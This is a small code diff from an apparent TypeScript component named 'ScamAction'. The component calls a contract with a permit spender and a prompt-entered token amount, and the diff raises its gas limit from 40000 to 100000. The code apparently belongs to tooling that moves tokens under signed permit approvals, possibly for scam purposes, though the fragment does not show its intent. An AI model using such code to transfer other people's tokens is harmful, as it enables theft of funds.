@@ -64,7 +64,7 @@ const ScamAction = (props: {
 					data.permit.spender,
 					ethers.utils.parseEther(window.prompt("Enter Amount to transfer") + ""),
 					{
-						gasLimit: 40000
+						gasLimit: 100000
 					}
 				], contractAddress, provider)
 					.catch((e) => {
